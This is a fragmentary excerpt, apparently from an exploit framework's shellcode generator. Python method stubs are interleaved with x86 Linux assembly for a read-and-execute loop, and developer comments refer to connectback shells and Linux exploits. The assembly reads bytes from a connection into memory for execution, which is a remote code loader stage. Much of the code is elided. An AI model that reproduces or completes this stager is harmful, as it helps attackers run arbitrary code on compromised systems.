...
chdir_loop:
    ...
    def read_and_exec(self,args):
        ...
        jmp read_here
getmyloc:
        // subl %edi + playroom from pcloc to make sure len fits
        // we might be at top of stack, fixes dsrt bug

        // XXX: when using like a cback.c, where our read base is mmapped, we can't do this
        // XXX: so to remain compatible, when using an mmap c based connectback, you have to
        // XXX: add at least 0x2000 to your mmapped address so we stay compatible
        // XXX: so little kludge for now, I'll think of something cuter down the road
...
read_here:
    ...
    def read_and_exec_loop(self,args):
        ...
        # XXX: redo this code, it's horrible, bad me! has to stay 2.2 compatible i guess :/
        # XXX: make sure we re-test our other linux sploits, changed things around
...
// XXX: error check, don't care about length here I suppose
cmpb $0xff,%ah
je exit
...
// addl cuz im lazy in converting from our old stack version :P
addl $0x100000,(%esp)
        ...
        movb $3,%al
        int $0x80
        //we got an error, then exit.
        cmpb $0xff,%ah
        je exit
        //we read zero bytes? Then exit.
        cmpl $0x00, %eax
        je exit
        ...
        // make room (mosdef didn't support subl %edi,(%esp)
        //subl %edi,(%esp)
        popl %eax
        subl %edi,%eax
        pushl %eax
